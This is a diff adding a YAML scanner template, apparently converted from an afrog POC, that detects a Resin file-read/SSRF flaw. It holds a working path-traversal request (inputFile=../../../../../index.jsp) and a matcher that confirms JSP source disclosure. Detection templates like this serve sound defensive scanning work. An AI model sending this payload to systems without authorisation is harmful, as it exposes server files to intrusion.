@@ -1,0 +1,26 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*" %>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp'
+id: resin-inputfile-fileread-or-ssrf
+info:
+  author: whynot
+  description: resin inputfile fileread or ssrf
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: resin inputfile fileread
+  severity: high
+  tags: resin,fileread,ssrf,argus-import
